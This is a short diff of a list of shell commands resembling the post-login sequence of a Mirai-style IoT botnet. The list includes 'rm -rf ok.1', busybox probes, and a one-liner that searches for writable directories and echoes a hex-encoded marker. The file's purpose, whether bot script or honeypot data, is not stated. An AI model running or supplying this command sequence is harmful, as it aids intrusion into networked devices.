@@ -1,6 +1,6 @@
-enable
 sh
 shell
+enable
 system
 config terminal
 linuxshell
@@ -55,6 +55,7 @@ rm -rf ok.1
 za
 zalee
 echo SHELL_TEST
+/bin/busybox TOKEN
 uname -s -m
 ./upnpsetup
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x56\x45\x4d\x43\x48\x4f'
